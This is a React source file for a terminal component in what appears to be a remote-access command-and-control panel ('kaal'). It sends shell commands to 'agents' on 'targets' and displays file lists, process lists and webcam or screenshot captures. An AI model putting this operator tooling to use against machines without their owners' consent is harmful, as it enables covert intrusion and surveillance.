import React, { useEffect, useRef } from 'react';
import { Terminal } from 'xterm';
import { FitAddon } from 'xterm-addon-fit';
import 'xterm/css/xterm.css';
import { sendCommand } from '../../services/api';
import { Terminal as TerminalIcon, Maximize2, Trash2 } from 'lucide-react';
import { kaalEvents } from '../../services/eventBus';

const CommandShell = ({ agentId }) => {
    const terminalRef = useRef(null);
    const term = useRef(null);
    const fitAddon = useRef(null);
    const commandBuffer = useRef('');

    const [isInteractive, setIsInteractive] = React.useState(false);

    useEffect(() => {
        // ... (Terminal Init) ...
        // Init Terminal
        term.current = new Terminal({
            theme: {
                background: '#0f0f23', // Matches bg-primary
                foreground: '#cdd6f4',
                cursor: '#00ff9f',
                selection: 'rgba(0, 255, 159, 0.3)',
                black: '#1a1a2e',
                red: '#ff4757',
                green: '#2ed573',
                yellow: '#ffa502',
                blue: '#1e90ff',
                magenta: '#ff6b81',
                cyan: '#00d4ff',
                white: '#ffffff',
            },
            fontFamily: '"JetBrains Mono", "Fira Code", Consolas, monospace',
            fontSize: 14,
            cursorBlink: true,
            cursorStyle: 'underline',
            lineHeight: 1.2,
            allowTransparency: true,
        });

        fitAddon.current = new FitAddon();
        term.current.loadAddon(fitAddon.current);
        term.current.open(terminalRef.current);
        fitAddon.current.fit();

        // Welcome Message
        term.current.writeln('\x1b[1;36m   __  __  ___    ___    __ \x1b[0m');
        term.current.writeln('\x1b[1;36m  / / / / / _ |  / _ |  / / \x1b[0m');
        term.current.writeln('\x1b[1;36m / /_/ / / __ | / __ | / /__\x1b[0m');
        term.current.writeln('\x1b[1;36m/_/___/ /_/ |_|/_/ |_|/____/\x1b[0m');
        term.current.writeln('');
        term.current.writeln('\x1b[1;32m[+] SECURE CONNECTION ESTABLISHED\x1b[0m');
        term.current.writeln(`\x1b[1;30mTarget ID: ${agentId}\x1b[0m`);
        term.current.writeln('');
        term.current.write('\x1b[1;32mroot@kaal\x1b[0m:\x1b[1;34m~\x1b[0m$ ');

        // Key Handler
        term.current.onKey(async (e) => {
            const char = e.key;
            const code = e.domEvent.keyCode;

            if (code === 13) { // Enter
                term.current.write('\r\n');
                const cmdToSend = commandBuffer.current.trim();

                if (cmdToSend) {
                    if (cmdToSend === 'clear') {
                        term.current.clear();
                        commandBuffer.current = '';
                    } else if (isInteractive) {
                        // Interactive Mode: Send input directly
                        await sendCommand(agentId, `shell_input ${cmdToSend}`);
                        // No local echo of result, wait for shell_output
                    } else {
                        // Normal Mode
                        await executeCommand(cmdToSend);
                    }
                } else if (isInteractive) {
                    // Empty enter in interactive mode usually sends newline
                    await sendCommand(agentId, `shell_input  `);
                }

                commandBuffer.current = '';
                if (!isInteractive) {
                    term.current.write('\x1b[1;32mroot@kaal\x1b[0m:\x1b[1;34m~\x1b[0m$ ');
                }
            } else if (code === 8) { // Backspace
                if (commandBuffer.current.length > 0) {
                    commandBuffer.current = commandBuffer.current.slice(0, -1);
                    term.current.write('\b \b');
                }
            } else if (code >= 32 && code <= 126) {
                commandBuffer.current += char;
                if (!isInteractive) term.current.write(char);
                else {
                    // In interactive mode, local echo? 
                    // Usually shells echo back. Double echo if we write here + shell output.
                    // Let's assume shell echoes back for now, but user experience might be laggy.
                    // Better to echo locally for responsiveness.
                    term.current.write(char);
                }
            }
        });

        const handleResize = () => fitAddon.current.fit();
        window.addEventListener('resize', handleResize);

        // Listen for task results
        const unsubscribeResult = kaalEvents.on('task_result', (data) => {
            if (data.agent_id !== agentId) return;
            if (isInteractive) return; // Ignore standard results in interactive mode? Or log them?

            let output = "";
            let cwd = null;

            try {
                const parsed = typeof data.result === 'string' ? JSON.parse(data.result) : data.result;

                if (parsed.type === "text" || parsed.type === "error") {
                    output = parsed.data || "";
                } else if (parsed.type === "file_list") {
                    cwd = parsed.path;
                    output = `Directory: ${parsed.path}\r\n`;
                    if (parsed.files) {
                        parsed.files.forEach(f => {
                            const size = f.is_dir ? "<DIR>" : f.size.toString().padStart(10);
                            const name = f.is_dir ? `\x1b[1;34m${f.name}\x1b[0m` : f.name;
                            output += `${size}  ${name}\r\n`;
                        });
                    }
                } else if (parsed.type === "process_list") {
                    if (parsed.processes) {
                        output = "PID     MEM      NAME\r\n";
                        output += "-----   -----    ----\r\n";
                        parsed.processes.forEach(p => {
                            output += `${p.pid.padEnd(8)} ${p.memory.padEnd(8)} ${p.name}\r\n`;
                        });
                    }
                } else if (parsed.type === "screenshot" || parsed.type === "webcam") {
                    output = `[Capture Received: ${parsed.type}] (See CAM/Files module)\r\n`;
                } else {
                    output = JSON.stringify(parsed, null, 2).replace(/\n/g, '\r\n');
                }
            } catch (e) {
                console.error("Shell JSON Parse Error!", e.message);
                console.error("Raw data string:", data.result);
                output = typeof data.result === 'string' ? data.result : JSON.stringify(data.result);
            }

            if (output.startsWith("[SHELL]")) output = output.substring(8);

            term.current.writeln(output.replace(/\n/g, '\r\n'));
            const prompt = cwd ? `\x1b[1;32mroot@kaal\x1b[0m:\x1b[1;34m${cwd}\x1b[0m$ ` : '\r\n\x1b[1;32mroot@kaal\x1b[0m:\x1b[1;34m~\x1b[0m$ ';
            term.current.write(prompt);
        });

        // Listen for Shell Output (Phase 8)
        const unsubscribeShell = kaalEvents.on('shell_output', (data) => {
            if (data.agent_id !== agentId) return;
            if (!isInteractive) return; // Ignore if not in mode?

            // Write raw output from shell
            // Replace newlines just in case
            const out = data.output.replace(/\n/g, '\r\n');
            term.current.write(out);
        });

        return () => {
            term.current.dispose();
            window.removeEventListener('resize', handleResize);
            unsubscribeResult();
            unsubscribeShell();
        };
    }, [agentId, isInteractive]); // Re-run if mode changes

    const toggleInteractive = async () => {
        if (!isInteractive) {
            term.current.writeln('\x1b[1;33m[*] Starting Interactive Shell Session...\x1b[0m');
            await sendCommand(agentId, 'shell_start');
            setIsInteractive(true);
        } else {
            term.current.writeln('\x1b[1;33m[*] Stopping Interactive Shell Session...\x1b[0m');
            await sendCommand(agentId, 'shell_stop');
            setIsInteractive(false);
            term.current.write('\r\n\x1b[1;32mroot@kaal\x1b[0m:\x1b[1;34m~\x1b[0m$ ');
        }
    };

    const executeCommand = async (cmd) => {
        try {
            const result = await sendCommand(agentId, `exec ${cmd}`);
            if (result.data && result.data.task) {
                term.current.writeln(`\x1b[90m[Task Queued: ${result.data.task}]\x1b[0m`);
            }
        } catch (error) {
            term.current.writeln(`\x1b[31m[ERROR] ${error.message}\x1b[0m`);
        }
    };

    return (
        <div className="h-full flex flex-col bg-[#0f0f23]">
            {/* Terminal Header */}
            <div className="flex items-center justify-between px-4 py-2 bg-[#1a1a2e] border-b border-[#2d2d44]">
                <div className="flex items-center space-x-2 text-xs font-mono text-gray-400">
                    <TerminalIcon className="w-4 h-4 text-accent-primary" />
                    <span>/bin/bash - 80x24</span>
                </div>
                <div className="flex space-x-2">
                    <button
                        onClick={toggleInteractive}
                        className={`px-2 py-0.5 text-xs font-mono rounded border transition-colors ${isInteractive
                            ? 'bg-green-500/20 text-green-400 border-green-500/50 hover:bg-green-500/30'
                            : 'bg-gray-800 text-gray-400 border-gray-700 hover:text-white'
                            }`}
                        title="Toggle Interactive Shell">
                        {isInteractive ? 'LIVE SHELL' : 'INTERACTIVE'}
                    </button>
                    <button
                        onClick={() => term.current.clear()}
                        className="p-1 hover:text-white text-gray-500 transition-colors" title="Clear">
                        <Trash2 className="w-4 h-4" />
                    </button>
                    <button className="p-1 hover:text-white text-gray-500 transition-colors" title="Maximize">
                        <Maximize2 className="w-4 h-4" />
                    </button>
                </div>
            </div>

            {/* Terminal Container */}
            <div className="flex-1 relative group">
                {/* Glow Effect on Focus (Simulated) */}
                <div className="absolute inset-0 bg-accent-primary/5 opacity-0 group-hover:opacity-100 transition-opacity pointer-events-none"></div>

                <div
                    ref={terminalRef}
                    className="absolute inset-0 p-4 overflow-hidden"
                />
            </div>
        </div>
    );
};

export default CommandShell;
